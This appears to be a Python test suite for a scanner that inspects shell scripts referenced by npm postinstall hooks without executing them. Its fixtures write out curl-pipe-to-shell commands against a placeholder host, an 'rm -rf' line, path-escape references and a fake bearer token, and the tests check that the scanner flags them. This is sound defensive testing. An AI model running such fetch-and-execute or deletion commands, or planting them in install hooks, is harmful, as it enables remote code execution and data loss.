"""No-execution, bounded local shell-reference regression tests."""
import json
import os
import subprocess
from pathlib import Path
import tempfile
import unittest

from clonepeek.scanner import scan
from clonepeek.script_review import literal_script_refs, safe_script_path


class ReferencedShellTests(unittest.TestCase):
    def make_project(self, root, script, command="sh ./scripts/setup.sh"):
        (root / "package.json").write_text(json.dumps({"scripts": {"postinstall": command}}))
        (root / "scripts").mkdir(exist_ok=True)
        (root / "scripts/setup.sh").write_text(script)

    def test_detects_indirect_fetch_execute_with_accurate_line(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            self.make_project(root, "#!/bin/sh\n# curl https://example.invalid/x | bash\necho safe\ncurl https://example.invalid/install.sh | sh\n")
            findings, scanned, skipped = scan(root)
            self.assertEqual((scanned, skipped), (1, 0))
            self.assertEqual(len(findings), 2)
            indirect = next(f for f in findings if f.rule == "referenced-shell-risk")
            self.assertEqual((indirect.path, indirect.line, indirect.severity),
                             ("scripts/setup.sh", 4, "critical"))
            self.assertIn("package.json", indirect.trigger)
            self.assertTrue(any(f.rule == "npm-lifecycle" for f in findings))

    def test_never_executes_script_and_reports_only_entry_point_for_ordinary_echo(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            witness = root / "SHOULD_NOT_EXIST"
            self.make_project(root, f"#!/bin/sh\ntouch {witness}\necho status ok\n")
            findings, _, _ = scan(root)
            self.assertFalse(witness.exists())
            self.assertEqual([f.rule for f in findings], ["npm-lifecycle"])

    def test_quoted_literal_script_is_inspected(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            self.make_project(root, "curl https://example.invalid/setup.sh | bash\n",
                              command='bash "./scripts/setup.sh"')
            findings, _, _ = scan(root)
            self.assertTrue(any(f.rule == "referenced-shell-risk" and f.severity == "critical"
                                for f in findings))

    def test_missing_script_makes_coverage_explicit(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "package.json").write_text('{"scripts":{"postinstall":"bash ./scripts/missing.sh"}}')
            findings, _, _ = scan(root)
            self.assertEqual({f.rule for f in findings},
                             {"npm-lifecycle", "referenced-script-unreadable"})

    def test_symlink_to_outside_not_followed(self):
        with tempfile.TemporaryDirectory() as temp, tempfile.TemporaryDirectory() as outside:
            root = Path(temp)
            (root / "scripts").symlink_to(Path(outside), target_is_directory=True)
            (Path(outside) / "setup.sh").write_text("curl https://example.invalid/x | sh")
            (root / "package.json").write_text('{"scripts":{"postinstall":"sh scripts/setup.sh"}}')
            findings, _, _ = scan(root)
            self.assertNotIn("referenced-shell-risk", {f.rule for f in findings})
            self.assertIn("referenced-script-unreadable", {f.rule for f in findings})

    def test_nested_package_resolves_within_its_package(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            folder = root / "app"
            folder.mkdir()
            self.make_project(folder, "rm -rf ./throwaway-example\n")
            findings, _, _ = scan(root)
            f = next(f for f in findings if f.rule == "referenced-shell-risk")
            self.assertEqual((f.path, f.severity), ("app/scripts/setup.sh", "high"))

    def test_oversized_referenced_script_is_not_silently_clean(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            self.make_project(root, "#" * (129 * 1024))
            findings, _, _ = scan(root)
            self.assertIn("referenced-script-unreadable", {f.rule for f in findings})

    @unittest.skipUnless(hasattr(os, "mkfifo"), "FIFO test requires POSIX")
    def test_fifo_reference_cannot_block(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "scripts").mkdir()
            os.mkfifo(root / "scripts/setup.sh")
            (root / "package.json").write_text('{"scripts":{"postinstall":"sh scripts/setup.sh"}}')
            findings, _, _ = scan(root)
            self.assertIn("referenced-script-unreadable", {f.rule for f in findings})

    def test_outside_and_dynamic_references_are_rejected(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            for ref in ("../escape.sh", "./../../escape.sh", "/etc/script.sh"):
                self.assertIsNone(safe_script_path(root, "package.json", ref))
            self.assertEqual(literal_script_refs("sh $SCRIPT"), [])
            self.assertEqual(literal_script_refs("bash -c 'curl https://example.invalid/x | sh'"), [])
            self.assertEqual(literal_script_refs("sh ../escape.sh"), ["../escape.sh"])

    def test_fingerprint_determinism(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            self.make_project(root, "curl https://example.invalid/abc | bash\n")
            a, _, _ = scan(root)
            b, _, _ = scan(root)
            self.assertEqual(a, b)

    def test_changed_since_rechecks_script_when_parent_config_is_unchanged(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            self.make_project(root, "echo original\n")
            subprocess.run(["git", "init", "-q", str(root)], check=True)
            subprocess.run(["git", "-C", str(root), "add", "package.json", "scripts/setup.sh"], check=True)
            subprocess.run(["git", "-C", str(root), "-c", "user.name=Test",
                            "-c", "user.email=test@example.invalid", "commit", "-qm", "baseline"], check=True)
            first, _, _ = scan(root, since="HEAD")
            self.assertFalse(first)
            (root / "scripts/setup.sh").write_text("curl https://example.invalid/x.sh | bash\n")
            found, inspected, skipped = scan(root, since="HEAD")
            self.assertEqual((inspected, skipped), (1, 0))
            self.assertEqual([f.rule for f in found], ["referenced-shell-risk"])
            self.assertEqual((found[0].path, found[0].severity),
                             ("scripts/setup.sh", "critical"))

    def test_script_body_redaction_is_best_effort(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            self.make_project(root, "curl https://example.invalid/x -H 'Authorization: Bearer sk-example012345678901234' | sh\n")
            findings, _, _ = scan(root)
            evidence = ' '.join(f.evidence for f in findings)
            self.assertNotIn("sk-example012345678901234", evidence)


if __name__ == "__main__":
    unittest.main()
